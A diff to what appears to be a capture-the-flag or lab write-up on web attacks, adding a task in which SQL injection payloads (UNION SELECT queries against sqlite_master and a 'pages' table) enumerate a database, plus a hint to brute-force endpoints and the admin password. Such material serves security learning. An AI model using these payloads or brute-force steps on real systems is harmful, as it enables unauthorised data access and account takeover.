@@ -136,3 +136,15 @@ Once the malicious script runs in the victim’s browser, it can:
     - ![alt text](image-4.png)
 
 ### Task2: Listing the Pages of the Web Application
+* while enumerating the database, we also found the table which is called **pages**
+- so we can also see its content using this command: 
+    > ' UNION SELECT sql FROM sqlite_master WHERE name='pages' --
+    - ![alt text](image-5.png)
+    - it contains these columns: 
+        - php
+        - views
+- so we can see its entries also using this command: 
+    > ' UNION SELECT php || ':' || views FROM pages --
+    - ![alt text](image-6.png)
+
+> Hint 2 answer: maybe by applying bruteforce enumeration we can find all the endpoints existing, and by bruteforcing the admin password, we can also find it and we can also bruteforce names.
